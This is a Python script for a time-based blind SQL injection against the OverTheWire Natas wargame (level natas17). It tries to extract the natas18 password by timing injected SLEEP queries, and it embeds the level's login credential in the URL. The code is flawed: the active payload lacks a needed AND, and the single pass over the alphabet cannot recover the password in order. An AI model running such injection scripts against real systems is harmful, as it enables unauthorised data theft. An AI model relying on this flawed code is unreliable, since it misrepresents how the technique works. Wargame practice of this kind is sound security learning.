import requests
import time

#" OR IF(password LIKE "{your_char}", SLEEP(3), 1) -- "
#query = 'natas18" IF(SELECT * from users where password LIKE BINARY "", SLEEP(2), 1) --'

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
URL = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
s = requests.Session()
result = ''

for i in alphabet:
	t = time.time()
	data = {'username': 'natas18" and password LIKE "'+i+'%" SLEEP(4) -- "'}
	r = s.post(URL,data=data)
	if((time.time() - t) > 3):
		result = result + i
		print(result)
	time.sleep(2)
